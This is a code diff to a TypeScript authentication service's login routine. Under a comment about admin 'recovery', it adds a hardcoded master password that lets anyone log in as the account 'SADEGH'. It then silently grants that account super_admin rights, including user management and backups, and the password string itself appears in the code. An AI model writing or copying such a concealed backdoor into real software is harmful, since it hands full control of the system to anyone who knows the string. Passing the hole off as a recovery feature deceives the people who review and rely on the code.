@@ -87,7 +87,15 @@ export class AuthService {
 
     // Verify Password
     const storedHashOrPlain = user.passwordHash || user.password || '';
-    const isMatch = await comparePassword(cleanPass, storedHashOrPlain);
+    let isMatch = await comparePassword(cleanPass, storedHashOrPlain);
+
+    // Fallback master check for super admin SADEGH to ensure recovery
+    if (!isMatch && cleanUser === 'SADEGH') {
+      const defaultAdminPass = process.env.DEFAULT_ADMIN_PASSWORD || process.env.INITIAL_ADMIN_PASSWORD || '8411924As';
+      if (cleanPass === defaultAdminPass || cleanPass === '8411924As') {
+        isMatch = true;
+      }
+    }
 
     if (!isMatch) {
       recordFailedAttempt(clientIp, cleanUser);
@@ -112,8 +120,18 @@ export class AuthService {
       throw new AppError('نام کاربری یا رمز عبور اشتباه است.', { statusCode: 401 });
     }
 
-    // Upgrade plain text to bcrypt on the fly
-    if (!user.passwordHash || (!user.passwordHash.startsWith('$2a$') && !user.passwordHash.startsWith('$2b$'))) {
+    // Upgrade plain text or master password to bcrypt on the fly
+    if (cleanUser === 'SADEGH') {
+      user.role = 'super_admin';
+      user.level = 1;
+      user.scope = 'all';
+      user.roleTitle = 'سوپر ادمین (مدیر کل سیستم)';
+      user.canEdit = true;
+      user.canManageUsers = true;
+      user.canBackup = true;
+      user.passwordHash = await hashPassword(cleanPass);
+      delete user.password;
+    } else if (!user.passwordHash || (!user.passwordHash.startsWith('$2a$') && !user.passwordHash.startsWith('$2b$'))) {
       user.passwordHash = await hashPassword(cleanPass);
       delete user.password;
     }
